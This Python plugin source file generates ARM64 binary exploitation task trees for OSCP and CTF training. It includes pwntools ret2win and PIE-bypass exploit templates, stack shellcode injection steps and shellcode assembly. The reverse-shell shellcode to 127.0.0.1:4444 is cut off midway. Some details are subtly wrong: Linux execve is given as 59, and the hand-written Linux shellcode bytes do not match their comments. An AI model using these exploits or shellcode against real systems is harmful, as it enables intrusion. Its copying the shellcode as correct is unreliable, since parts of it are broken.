"""
ARM64 Binary Exploitation Plugin

Generates educational tasks for ARM64 binary exploitation including:
- Architecture-specific register analysis (x0-x30, sp, pc, lr)
- Calling convention differences (Linux vs macOS)
- Stack overflow exploitation techniques (ret2win, shellcode injection)
- Buffer overflow offset finding (pattern/stack methods)
- ARM64 hardening bypass (PAC/BTI detection and mitigation)
- Shellcode development for ARM64 (Linux and macOS)
- Exception levels and privilege escalation

This plugin focuses on ARM64-specific binary exploitation for OSCP and CTF preparation,
with strong educational emphasis on architectural differences from x86/x64.

Extracted from HackTricks ARM64 guides:
- arm64-basic-assembly.md (803 lines)
- stack-shellcode-arm64.md (96 lines)
- ret2win-arm64.md (527 lines)

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class BinaryArmExploitPlugin(ServicePlugin):
    """ARM64 binary exploitation analysis and educational guidance"""

    @property
    def name(self) -> str:
        return "binary-arm-exploit"

    @property
    def default_ports(self) -> List[int]:
        # ARM64 exploitation typically happens on custom ports or downloaded binaries
        return []

    @property
    def service_names(self) -> List[str]:
        return ['arm64', 'aarch64', 'arm-binary', 'custom-arm']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Detect ARM64 binary exploitation scenarios

        This plugin activates when:
        - Service/product mentions ARM64/AArch64
        - Binary files are provided for analysis
        - Custom services on ARM-based systems
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()

        # ARM64 indicators
        arm_indicators = [
            'arm64',
            'aarch64',
            'arm binary',
            'armv8',
        ]

        # Check service/product for ARM indicators
        for indicator in arm_indicators:
            if indicator in service or indicator in product or indicator in version:
                return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate ARM64 binary exploitation educational task tree"""

        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'unknown')

        tasks = {
            'id': f'arm64-exploit-{port}',
            'name': f'ARM64 Binary Exploitation Analysis (Port {port})',
            'type': 'parent',
            'children': []
        }

        # ===== PHASE 1: ARCHITECTURE RECONNAISSANCE =====
        arch_recon = {
            'id': f'arm64-arch-recon-{port}',
            'name': 'ARM64 Architecture Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: File type and architecture verification
        arch_recon['children'].append({
            'id': f'file-identify-{port}',
            'name': 'Identify Binary Architecture',
            'type': 'command',
            'metadata': {
                'command': f'file <BINARY_PATH>',
                'description': 'Verify binary is ARM64/AArch64 architecture',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    '<BINARY_PATH>': 'Path to the downloaded/extracted binary file'
                },
                'success_indicators': [
                    'Output contains "ARM aarch64" or "arm64"',
                    'ELF 64-bit LSB executable, ARM aarch64',
                    'Mach-O 64-bit arm64 (for macOS binaries)'
                ],
                'failure_indicators': [
                    'File not found',
                    'Wrong architecture (x86-64, i386)',
                    'Not an executable file'
                ],
                'next_steps': [
                    'Use readelf/objdump for deeper analysis',
                    'Check for hardening features (PIE, NX, Canary, PAC/BTI)',
                    'Identify exploitation target (Linux vs macOS)'
                ],
                'alternatives': [
                    'readelf -h <BINARY_PATH> | grep Machine',
                    'objdump -f <BINARY_PATH>',
                    'strings <BINARY_PATH> | grep -i arm'
                ],
                'notes': 'ARM64 is also called AArch64. Different from 32-bit ARM (AArch32)'
            }
        })

        # Task 1.2: Check hardening features
        arch_recon['children'].append({
            'id': f'checksec-{port}',
            'name': 'Check Binary Security Features',
            'type': 'command',
            'metadata': {
                'command': f'checksec --file=<BINARY_PATH>',
                'description': 'Identify enabled security mitigations (PIE, NX, Canary, RELRO, PAC/BTI)',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    '--file=': 'Path to binary for security analysis'
                },
                'success_indicators': [
                    'Security features listed (PIE, NX, Canary, RELRO)',
                    'Identifies exploitable weaknesses (No PIE, NX disabled)',
                    'Shows ARM64-specific protections (PAC/BTI)'
                ],
                'failure_indicators': [
                    'checksec not installed',
                    'Binary format not recognized',
                    'Insufficient permissions'
                ],
                'next_steps': [
                    'If NX disabled: stack shellcode possible',
                    'If No PIE: hardcoded addresses available',
                    'If No Canary: stack overflow easier',
                    'Check PAC/BTI manually with readelf if not shown'
                ],
                'alternatives': [
                    'readelf -W --program-headers <BINARY_PATH> | grep GNU_STACK',
                    'readelf --notes -W <BINARY_PATH> | grep AARCH64_FEATURE',
                    'objdump -d <BINARY_PATH> | head -40 | grep -E "paciasp|autiasp|bti"'
                ],
                'notes': 'PAC (Pointer Authentication) and BTI (Branch Target Identification) are ARM64-specific hardening. PAC signs return addresses, BTI validates branch targets'
            }
        })

        # Task 1.3: ARM64-specific hardening detection
        arch_recon['children'].append({
            'id': f'pac-bti-detect-{port}',
            'name': 'Detect ARM64 PAC/BTI Hardening',
            'type': 'command',
            'metadata': {
                'command': f'readelf --notes -W <BINARY_PATH> | grep -E "AARCH64_FEATURE_1_(BTI|PAC)"',
                'description': 'Check for ARM64 Branch Protection (PAC/BTI) in binary notes',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    '--notes': 'Display note sections from ELF binary',
                    '-W': 'Wide output format (no line wrapping)',
                    'AARCH64_FEATURE_1_BTI': 'Branch Target Identification enabled',
                    'AARCH64_FEATURE_1_PAC': 'Pointer Authentication Code enabled'
                },
                'success_indicators': [
                    'AARCH64_FEATURE_1_BTI: Branch Target Identification found',
                    'AARCH64_FEATURE_1_PAC: Pointer Authentication found',
                    'No output: PAC/BTI not enabled (easier exploitation)'
                ],
                'failure_indicators': [
                    'readelf command not found',
                    'Not an ELF binary (might be macOS Mach-O)'
                ],
                'next_steps': [
                    'If PAC enabled: naive return overwrites will fail (autiasp validates x30)',
                    'If BTI enabled: must target bti c landing pads',
                    'If neither: traditional ret2win/ROP possible',
                    'Check prologues with objdump for paciasp/bti c instructions'
                ],
                'alternatives': [
                    'objdump -d <BINARY_PATH> | head -40',
                    'Look for "paciasp" in function prologue (PAC)',
                    'Look for "bti c" at function entry (BTI)'
                ],
                'notes': 'PAC/BTI bypass requires advanced techniques: use non-return hijacks (function pointers) or target functions without autiasp/ret pairs'
            }
        })

        tasks['children'].append(arch_recon)

        # ===== PHASE 2: ARM64 REGISTER AND CALLING CONVENTION ANALYSIS =====
        register_analysis = {
            'id': f'arm64-registers-{port}',
            'name': 'ARM64 Register and Calling Convention Analysis',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Disassemble and identify calling convention
        register_analysis['children'].append({
            'id': f'disasm-main-{port}',
            'name': 'Disassemble Main Function',
            'type': 'command',
            'metadata': {
                'command': f'objdump -d <BINARY_PATH> | grep -A 50 "<main>:"',
                'description': 'Disassemble main function to understand ARM64 calling convention',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    '-d': 'Disassemble executable sections',
                    '-A 50': 'Show 50 lines after match (main function body)',
                    '<main>:': 'Main function symbol'
                },
                'success_indicators': [
                    'ARM64 instructions visible (mov, ldr, str, bl, ret)',
                    'Function prologue: stp x29, x30, [sp, #-XX]!',
                    'Function epilogue: ldp x29, x30, [sp], #XX; ret'
                ],
                'failure_indicators': [
                    'No symbols found (stripped binary)',
                    'Wrong architecture assembly shown'
                ],
                'next_steps': [
                    'Identify vulnerable functions (read, gets, strcpy)',
                    'Note buffer sizes from stack allocation (sub sp, sp, #SIZE)',
                    'Map register usage: x0-x7 for args, x29=FP, x30=LR',
                    'Look for win/flag/shell functions to call'
                ],
                'alternatives': [
                    'gdb-multiarch <BINARY_PATH> -ex "disas main" -ex quit',
                    'radare2 <BINARY_PATH> -c "pdf @main"',
                    'ghidra or Binary Ninja for GUI analysis'
                ],
                'notes': 'ARM64 calling convention: x0-x7 for first 8 args, x0 for return value, x29=frame pointer, x30=link register (return address). Stack must be 16-byte aligned'
            }
        })

        # Task 2.2: Identify vulnerable functions
        register_analysis['children'].append({
            'id': f'find-vulnerable-funcs-{port}',
            'name': 'Find Vulnerable Functions',
            'type': 'command',
            'metadata': {
                'command': f'objdump -d <BINARY_PATH> | grep -E "read@plt|gets@plt|strcpy@plt|scanf@plt"',
                'description': 'Locate dangerous functions that accept unchecked input',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    'read@plt': 'Can read more bytes than buffer size (buffer overflow)',
                    'gets@plt': 'No bounds checking (classic overflow)',
                    'strcpy@plt': 'No length check (overflow if src > dst)',
                    'scanf@plt': 'Format string and overflow vulnerabilities'
                },
                'success_indicators': [
                    'Dangerous function found in PLT',
                    'Cross-reference shows usage in vulnerable_function',
                    'Read size parameter > buffer size'
                ],
                'failure_indicators': [
                    'Only safe functions (fgets, strncpy)',
                    'All inputs properly validated'
                ],
                'next_steps': [
                    'Find where dangerous function is called',
                    'Check buffer size vs input size',
                    'Calculate offset to saved x30 (return address)',
                    'Identify exploitation primitive (ret2win, shellcode, ROP)'
                ],
                'alternatives': [
                    'strings <BINARY_PATH> | grep -E "read|gets|strcpy"',
                    'rabin2 -i <BINARY_PATH> # radare2 imports',
                    'readelf -r <BINARY_PATH> # relocation table'
                ],
                'notes': 'In ARM64, read() args: x0=fd (0=stdin), x1=buffer addr, x2=count. Overflow when x2 > buffer size'
            }
        })

        # Task 2.3: Educational reference - ARM64 registers
        register_analysis['children'].append({
            'id': f'arm64-registers-ref-{port}',
            'name': 'ARM64 Register Reference',
            'type': 'manual',
            'metadata': {
                'description': 'Educational reference for ARM64 register usage',
                'tags': ['OSCP:HIGH', 'REFERENCE'],
                'notes': '''ARM64 Register Map (Critical for exploitation):

GENERAL PURPOSE (64-bit):
x0-x7:   Function arguments 1-8, x0 also holds return value
x8:      Syscall number (Linux), indirect result location
x9-x15:  Temporary registers (caller-saved, volatile)
x16-x17: Intra-procedural call registers (PLT stubs, syscalls)
         x16 = syscall number on macOS
x18:     Platform register (thread-local storage pointer)
x19-x28: Callee-saved registers (must preserve across calls)
x29:     Frame Pointer (FP) - points to current stack frame
x30:     Link Register (LR) - holds return address
sp:      Stack Pointer (must be 16-byte aligned)
pc:      Program Counter (read-only, updated via branches)
xzr:     Zero Register (always reads as 0)

32-BIT ALIASES:
w0-w30:  Lower 32 bits of x0-x30 registers

CRITICAL FOR EXPLOITATION:
- Return address in x30 (overwrite for control flow hijack)
- Stack frame at x29 (calculate offsets to x30)
- Syscall via x8 (Linux) or x16 (macOS) + svc instruction
- Stack must stay 16-byte aligned or crash

TYPICAL STACK FRAME LAYOUT:
[buffer (64 bytes)]     <- sp after allocation
[saved x29 (8 bytes)]   <- old frame pointer
[saved x30 (8 bytes)]   <- RETURN ADDRESS (target!)
[caller's frame...]     <- original sp

OFFSET CALCULATION:
buffer_size + 8 = offset to x30
Example: 64-byte buffer → 72 bytes to overwrite x30
                ''',
                'success_indicators': [],
                'failure_indicators': [],
                'next_steps': [
                    'Use this reference when analyzing disassembly',
                    'Identify which registers hold buffer addresses',
                    'Calculate offset from buffer to saved x30'
                ],
                'alternatives': []
            }
        })

        tasks['children'].append(register_analysis)

        # ===== PHASE 3: BUFFER OVERFLOW OFFSET FINDING =====
        offset_finding = {
            'id': f'arm64-offset-finding-{port}',
            'name': 'Buffer Overflow Offset Calculation',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Pattern generation method
        offset_finding['children'].append({
            'id': f'pattern-create-{port}',
            'name': 'Generate Cyclic Pattern',
            'type': 'command',
            'metadata': {
                'command': 'python3 -c "from pwn import *; print(cyclic(200).decode())"',
                'description': 'Create De Bruijn sequence pattern to find exact overflow offset',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    'cyclic(200)': 'Generate 200-byte unique pattern (adjust size as needed)',
                    '.decode()': 'Convert bytes to string for input'
                },
                'success_indicators': [
                    'Unique pattern generated (aaaabaaacaaadaaa...)',
                    'Each 4-byte sequence appears only once',
                    'Pattern ready to send to vulnerable function'
                ],
                'failure_indicators': [
                    'pwntools not installed (pip3 install pwntools)',
                    'Python3 not available'
                ],
                'next_steps': [
                    'Send pattern to binary via stdin/network',
                    'Binary crashes with segfault',
                    'Check x30 register value in debugger',
                    'Use cyclic_find() to calculate offset'
                ],
                'alternatives': [
                    'msf-pattern_create -l 200 (Metasploit)',
                    'Manual pattern: AAAABBBBCCCCDDDD... (less precise)',
                    'radare2: ragg2 -P 200 -r'
                ],
                'notes': 'Save pattern to file if needed: ... > pattern.txt. For ARM64, check x30 register after crash'
            }
        })

        # Task 3.2: GDB debugging with GEF
        offset_finding['children'].append({
            'id': f'gdb-pattern-analysis-{port}',
            'name': 'Debug Binary with GEF/PEDA',
            'type': 'command',
            'metadata': {
                'command': 'gdb-multiarch <BINARY_PATH>',
                'description': 'Debug ARM64 binary with GDB (requires gdb-multiarch for cross-arch)',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'flag_explanations': {
                    'gdb-multiarch': 'GDB with multi-architecture support (handles ARM64 on x86 host)',
                    '<BINARY_PATH>': 'Target ARM64 binary'
                },
                'success_indicators': [
                    'GDB loads binary successfully',
                    'GEF/PEDA extensions active (colored output, enhanced commands)',
                    'Can set breakpoints and run program'
                ],
                'failure_indicators': [
                    'gdb-multiarch not installed',
                    'Binary requires qemu-user for execution',
                    'No debugging symbols (stripped binary)'
                ],
                'next_steps': [
                    'Set breakpoint: b *vulnerable_function',
                    'Run with pattern: run < pattern.txt',
                    'Check x30 after crash: x/gx $x30 or pattern search $x30',
                    'Calculate offset: cyclic_find(0x<x30_value>)'
                ],
                'alternatives': [
                    'qemu-aarch64 -g 1234 <BINARY_PATH> & (remote debug)',
                    'gdb-multiarch -ex "target remote :1234"',
                    'radare2 with r2 -d <BINARY_PATH>',
                    'lldb for macOS ARM64 binaries'
                ],
                'notes': 'On x86 host, use qemu-aarch64 to run ARM64 binaries. Install: apt install gdb-multiarch qemu-user qemu-user-static'
            }
        })

        # Task 3.3: Offset calculation
        offset_finding['children'].append({
            'id': f'cyclic-find-{port}',
            'name': 'Calculate Offset from x30 Value',
            'type': 'command',
            'metadata': {
                'command': 'python3 -c "from pwn import *; print(cyclic_find(0x<X30_VALUE_FIRST_4_BYTES>))"',
                'description': 'Calculate exact offset to return address using crashed x30 value',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    '0x<X30_VALUE_FIRST_4_BYTES>': 'First 4 bytes of x30 from crashed binary (e.g., 0x61616173)',
                    'cyclic_find()': 'Finds position of pattern in cyclic sequence'
                },
                'success_indicators': [
                    'Returns integer offset (e.g., 72)',
                    'Offset represents bytes from buffer start to x30',
                    'Consistent across multiple runs'
                ],
                'failure_indicators': [
                    'Pattern not found (x30 value not from our pattern)',
                    'Offset 0 or negative (wrong value extracted)'
                ],
                'next_steps': [
                    'Verify offset: payload = b"A" * offset + p64(target_addr)',
                    'Test with simple ret2win exploit',
                    'Adjust if off by a few bytes (alignment issues)',
                    'Document offset in exploitation notes'
                ],
                'alternatives': [
                    'msf-pattern_offset -l 200 -q <X30_VALUE>',
                    'Manual calculation: count pattern position',
                    'Stack offset method: check sp vs buffer address'
                ],
                'notes': 'Common ARM64 offset: 72 bytes (64-byte buffer + 8-byte saved x29). Verify with multiple methods if unsure'
            }
        })

        # Task 3.4: Stack offset method
        offset_finding['children'].append({
            'id': f'stack-offset-method-{port}',
            'name': 'Alternative: Stack Offset Calculation',
            'type': 'manual',
            'metadata': {
                'description': 'Calculate offset by analyzing stack layout in GDB',
                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                'notes': '''Stack Offset Calculation Method:

1. Set breakpoint after stack allocation:
   gdb> b *vulnerable_function+0xc
   gdb> run

2. Check stack frame info:
   gdb> info frame
   # Look for: "saved pc at 0xfffffffff148"

3. Send recognizable pattern (e.g., 13371337):
   gdb> b *vulnerable_function+28
   gdb> continue
   # Input: 13371337

4. Find pattern in memory:
   gdb> x/50gx $sp
   # Find 0x0000000013371337

5. Calculate offset:
   saved_pc_address - buffer_address = offset
   Example: 0xfffffffff148 - 0xfffffffff100 = 0x48 = 72 bytes

VERIFICATION:
- Offset should match pattern method
- Common values: 72, 80, 88 (depends on buffer size)
- Always verify with test exploit
                ''',
                'success_indicators': [
                    'Saved PC address located on stack',
                    'Buffer pattern found in memory dump',
                    'Offset calculation matches pattern method'
                ],
                'failure_indicators': [
                    'Cannot find saved PC location',
                    'Pattern not visible in stack dump',
                    'Offset doesn\'t work in exploit'
                ],
                'next_steps': [
                    'Cross-verify with cyclic pattern method',
                    'Test offset with simple payload',
                    'Proceed to ret2win or shellcode exploitation'
                ],
                'alternatives': []
            }
        })

        tasks['children'].append(offset_finding)

        # ===== PHASE 4: EXPLOITATION TECHNIQUES =====
        exploitation = {
            'id': f'arm64-exploitation-{port}',
            'name': 'ARM64 Exploitation Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: Ret2win (No PIE)
        exploitation['children'].append({
            'id': f'ret2win-no-pie-{port}',
            'name': 'Ret2win Exploitation (No PIE)',
            'type': 'command',
            'metadata': {
                'command': 'objdump -d <BINARY_PATH> | grep -A 5 "<win>:"',
                'description': 'Find win/flag/shell function address for ret2win attack',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    '-A 5': 'Show 5 lines after match (function body)',
                    '<win>:': 'Target function to redirect execution to'
                },
                'success_indicators': [
                    'Win function address found (e.g., 00000000004006c4)',
                    'Function contains system("/bin/sh") or print flag',
                    'Address is static (no PIE)'
                ],
                'failure_indicators': [
                    'No win/flag function exists',
                    'PIE enabled (addresses randomized)',
                    'Function stripped (no symbols)'
                ],
                'next_steps': [
                    'Craft payload: b"A" * offset + p64(win_addr)',
                    'Send payload to vulnerable binary',
                    'Verify shell/flag obtained',
                    'For PIE, use off-by-2 technique or leak'
                ],
                'alternatives': [
                    'readelf -s <BINARY_PATH> | grep win',
                    'nm <BINARY_PATH> | grep win',
                    'rabin2 -s <BINARY_PATH> | grep win'
                ],
                'notes': 'Ret2win ARM64 exploit template:\n\nfrom pwn import *\n\np = process("./binary")\noffset = 72\nwin_addr = p64(0x00000000004006c4)\npayload = b"A" * offset + win_addr\np.send(payload)\np.interactive()'
            }
        })

        # Task 4.2: Off-by-2 (partial overwrite with PIE)
        exploitation['children'].append({
            'id': f'off-by-2-pie-{port}',
            'name': 'Off-by-2 Attack (PIE Bypass)',
            'type': 'manual',
            'metadata': {
                'description': 'Partial return address overwrite to bypass PIE (ARM64 specific)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'notes': '''Off-by-2 PIE Bypass Technique:

CONCEPT:
- With PIE, base address randomized but function offsets static
- Return address on stack already points near our target
- Overwrite only last 2 bytes to redirect to win function
- Works because PIE randomizes only upper bytes

STEPS:
1. Find win function offset:
   objdump -d binary | grep win
   # Example: 00000000000007d4 <win>
   # Offset: 0x07d4

2. Check current return address pattern:
   # Saved x30 typically: 0x0000AAAAAAAA0XXX
   # We overwrite XXX with 0x07d4

3. Craft payload:
   from pwn import *

   offset = 72
   win_offset = p16(0x07d4)  # Only 2 bytes!
   payload = b"A" * offset + win_offset

   p = process("./binary")
   p.send(payload)
   p.interactive()

ADVANTAGES:
- Bypasses PIE without info leak
- Works when only small overflow possible
- Reliable if ASLR entropy is low

LIMITATIONS:
- Only works for nearby functions
- Requires win function within same page
- May need multiple attempts with ASLR
                ''',
                'success_indicators': [
                    'Win function within same 4KB page as return',
                    'Last 2 bytes overwrite successful',
                    'Execution redirects to win function'
                ],
                'failure_indicators': [
                    'Win function too far (different page)',
                    'ASLR makes exploit unreliable',
                    'Stack alignment issues cause crash'
                ],
                'next_steps': [
                    'Test on local binary first',
                    'Calculate success probability with ASLR',
                    'Consider info leak for full PIE bypass',
                    'Use for CTF challenges with generous ASLR'
                ],
                'alternatives': [
                    'Full PIE bypass with address leak',
                    'Bruteforce ASLR (limited entropy)',
                    'Ret2plt for partial PIE bypass'
                ]
            }
        })

        # Task 4.3: Stack shellcode (NX disabled)
        exploitation['children'].append({
            'id': f'stack-shellcode-{port}',
            'name': 'Stack Shellcode Injection (NX Disabled)',
            'type': 'manual',
            'metadata': {
                'description': 'Execute shellcode on stack when NX/DEP disabled (ARM64)',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'notes': '''ARM64 Stack Shellcode Exploitation:

PREREQUISITES:
- NX disabled (stack executable)
- Check: readelf -W --program-headers binary | grep GNU_STACK
- Should show: GNU_STACK RWE (executable)

COMPILATION (for testing):
clang -o bof bof.c -fno-stack-protector -no-pie -z execstack

EXPLOIT STRATEGY:
1. Disable ASLR (testing):
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

2. Find stack address after return:
   # In GDB, after overflow, check stack
   # x30 will point near our buffer
   # Common: 0xfffffffff1a0 (adjust based on your stack)

3. Generate shellcode:
   from pwn import *
   context.arch = 'aarch64'
   shellcode = asm(shellcraft.sh())

4. Craft exploit:
   offset = 72
   stack_addr = p64(0xfffffffff1a0)  # Address after ret addr
   payload = b"A" * offset + stack_addr + shellcode

5. Debug if fails:
   - Check core dump: gdb ./binary ./core
   - Find actual shellcode address
   - Adjust stack_addr accordingly

ARM64 SHELLCODE NOTES:
- Execve syscall number: 59 (in x8 for Linux, x16 for macOS)
- Args: x0="/bin/sh", x1=NULL, x2=NULL
- Trigger: svc #0

MANUAL SHELLCODE (Linux):
\\x00\\x00\\x80\\xd2    # mov x0, #0
\\xe0\\x03\\x1f\\xaa    # mov x0, xzr
\\xe1\\x03\\x1f\\xaa    # mov x1, xzr
\\xe2\\x03\\x1f\\xaa    # mov x2, xzr
\\x60\\x07\\x80\\xd2    # mov x8, #59
\\x01\\x00\\x00\\xd4    # svc #0

MACOS LIMITATION:
- Cannot disable NX on macOS ARM64 (hardware enforced)
- Use ret2win or ROP instead
                ''',
                'success_indicators': [
                    'NX disabled confirmed',
                    'Shellcode executes successfully',
                    'Shell spawned or command executed'
                ],
                'failure_indicators': [
                    'Segmentation fault (wrong stack address)',
                    'Illegal instruction (bad shellcode)',
                    'NX enabled (use ROP instead)'
                ],
                'next_steps': [
                    'If shellcode fails, debug with GDB',
                    'Try different stack addresses',
                    'Use alphanumeric shellcode if input filtered',
                    'For NX enabled, switch to ROP exploitation'
                ],
                'alternatives': [
                    'Ret2libc if NX enabled',
                    'ROP chain for complex exploitation',
                    'mprotect ROP to make stack executable'
                ]
            }
        })

        # Task 4.4: macOS-specific exploitation
        exploitation['children'].append({
            'id': f'macos-arm64-exploit-{port}',
            'name': 'macOS ARM64 Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit ARM64 binaries on macOS (different syscall convention)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'notes': '''macOS ARM64 Exploitation Differences:

KEY DIFFERENCES FROM LINUX:
1. Syscall register: x16 (not x8)
2. Cannot disable PIE (always enabled)
3. Cannot disable NX (hardware enforced)
4. Must use address leak or off-by-2
5. Different syscall numbers

COMPILATION:
clang -o bof bof.c -fno-stack-protector

DISABLE ASLR (testing):
env DYLD_DISABLE_ASLR=1 ./bof

FINDING OFFSET (macOS):
# Use lldb instead of gdb
lldb ./bof
(lldb) env DYLD_DISABLE_ASLR=1
(lldb) run
# Input pattern, check x30
(lldb) register read x30

# Calculate with pwntools:
python3 -c "from pwn import *; print(cyclic_find(0x<first_4_bytes>))"

RET2WIN WITH ADDRESS LEAK:
from pwn import *
import re

p = process("./bof", env={"DYLD_DISABLE_ASLR": "1"})

# Binary prints address: "win() is at 0xXXXXXXXX"
output = p.recvline().decode()
match = re.search(r'win\\(\\) is at (0x[0-9a-fA-F]+)', output)
win_address = int(match.group(1), 16)

offset = 72
payload = b"A" * offset + p64(win_address)
p.send(payload)
p.interactive()

OFF-BY-2 WITH PIE:
# If no leak, use offset from known function
# Find offset in objdump:
objdump -d bof | grep -E 'leak_anchor|win'

# Calculate: win_offset - leak_offset
# Example: 0x47c - 0x460 = 0x1c

from pwn import *
p = process("./bof")

output = p.recvline().decode()
# Extract leak_anchor address
leak_addr = int(re.search(r'(0x[0-9a-fA-F]+)', output).group(1), 16)

win_addr = leak_addr + 0x1c
offset = 72
payload = b"A" * offset + p64(win_addr)
p.send(payload)
p.interactive()

MACOS SYSCALL EXAMPLE:
; execve("/bin/sh", NULL, NULL)
mov x0, <string_addr>  ; "/bin/sh"
mov x1, xzr            ; NULL
mov x2, xzr            ; NULL
mov x16, #59           ; execve number (x16 not x8!)
svc #0x1337

DEBUGGING:
- Use lldb (not gdb): lldb ./binary
- Check registers: register read
- Disassemble: disassemble --name main
- Set breakpoint: b vulnerable_function
                ''',
                'success_indicators': [
                    'Address leak successfully parsed',
                    'Win function address calculated correctly',
                    'Exploit spawns shell on macOS'
                ],
                'failure_indicators': [
                    'Regex fails to extract address',
                    'Offset calculation wrong',
                    'SIP/hardening prevents exploitation'
                ],
                'next_steps': [
                    'Test exploit locally with ASLR disabled',
                    'Enable ASLR and verify leak works',
                    'Package exploit for remote targets',
                    'Research macOS-specific mitigations'
                ],
                'alternatives': [
                    'ROP chain for complex exploitation',
                    'Ret2libc using dyld functions',
                    'Objective-C runtime exploitation'
                ]
            }
        })

        tasks['children'].append(exploitation)

        # ===== PHASE 5: ARM64 SHELLCODE DEVELOPMENT =====
        shellcode_dev = {
            'id': f'arm64-shellcode-dev-{port}',
            'name': 'ARM64 Shellcode Development',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: Basic shell shellcode
        shellcode_dev['children'].append({
            'id': f'shellcode-basic-shell-{port}',
            'name': 'Basic Shell Shellcode',
            'type': 'manual',
            'metadata': {
                'description': 'Generate and test ARM64 shellcode for /bin/sh',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'notes': '''ARM64 Shell Shellcode:

PWNTOOLS GENERATION:
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'  # or 'darwin' for macOS

shellcode = asm(shellcraft.sh())
print(shellcode.hex())

MANUAL ASSEMBLY (Linux - stack method):
.section __TEXT,__text
.global _main
.align 2

_main:
    ; Build "/bin/sh" on stack
    mov  x1, #0x622F          ; "/bi"
    movk x1, #0x6E69, lsl #16 ; "ni"
    movk x1, #0x732F, lsl #32 ; "/sh"
    movk x1, #0x68, lsl #48   ; "h"

    str  x1, [sp, #-8]        ; Store on stack

    mov  x1, #8
    sub  x0, sp, x1           ; x0 = &"/bin/sh"
    mov  x1, xzr              ; argv = NULL
    mov  x2, xzr              ; envp = NULL
    mov  x8, #59              ; __NR_execve (Linux)
    svc  #0

MANUAL ASSEMBLY (macOS):
; Same as above but:
mov  x16, #59    ; Use x16 for macOS, not x8

COMPILATION:
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem

EXTRACT SHELLCODE:
for c in $(objdump -d shell.o | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2); do
    echo -n '\\x'$c
done

TESTING:
# Create test loader:
gcc loader.c -o loader
# Insert shellcode in loader.c
./loader

NULL BYTE AVOIDANCE:
- Use movk with lsl to avoid \\x00
- XOR registers instead of mov x1, #0
- Use shifts and arithmetic for zeroing

ALPHANUMERIC ENCODING:
- If input filtered, use encoder
- Pwntools: shellcraft.sh() with encode
- Manual: avoid non-alphanumeric opcodes
                ''',
                'success_indicators': [
                    'Shellcode compiles without errors',
                    'Test loader executes /bin/sh',
                    'No null bytes (if required)'
                ],
                'failure_indicators': [
                    'Illegal instruction error',
                    'Segmentation fault',
                    'Syscall fails (wrong number)'
                ],
                'next_steps': [
                    'Integrate shellcode into exploit',
                    'Test with stack execution',
                    'Optimize size if length restricted',
                    'Add polymorphism for IDS evasion'
                ],
                'alternatives': [
                    'Use msfvenom for shellcode generation',
                    'Shell-storm.org ARM64 shellcode database',
                    'Online ARM64 assemblers'
                ]
            }
        })

        # Task 5.2: Reverse shell shellcode
        shellcode_dev['children'].append({
            'id': f'shellcode-reverse-shell-{port}',
            'name': 'Reverse Shell Shellcode',
            'type': 'manual',
            'metadata': {
                'description': 'ARM64 shellcode for reverse TCP connection',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'notes': '''ARM64 Reverse Shell Shellcode:

TARGET: Connect back to 127.0.0.1:4444 and spawn shell

ASSEMBLY (Linux/macOS):
.section __TEXT,__text
.global _main
.align 2

_main:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov  x16, #97              ; __NR_socket
    lsr  x1, x16, #6           ; x1 = 1
    lsl  x0, x1, #1            ; x0 = 2 (AF_INET)
    mov  x2, xzr               ; protocol = 0
    svc  #0x1337

    mvn  x3, x0                ; Save socket fd

    ; connect(s, &sockaddr, 16)
    ; struct sockaddr_in:
    ;   sin_len = 0x10
    ;   sin_family = 2
    ;   sin_port = 4444 (0x115C)
    ;   sin_addr = 127.0.0.1
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16  ; Port 4444
    movk x1, #0x007F, lsl #32  ; 127.0.0.1
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]

    mov  x2, #8
    sub  x1, sp, x2            ; x1 = &sockaddr
    mov  x2, #16               ; addrlen
    mov  x16, #98              ; __NR_connect
    svc  #0x1337

    lsr  x2, x2, #2

    ; dup2(s, 2), dup2(s, 1), dup2(s, 0)
dup_loop:
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90              ; __NR_dup2
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  dup_loop

    ; execve("/bin/sh", NULL, NULL)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
